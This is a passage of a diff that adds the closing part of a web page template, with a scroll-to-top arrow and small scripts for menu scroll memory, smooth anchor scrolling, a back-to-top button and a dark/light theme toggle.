+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({ behavior: "smooth" });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+</script>
+</body>
+</html>
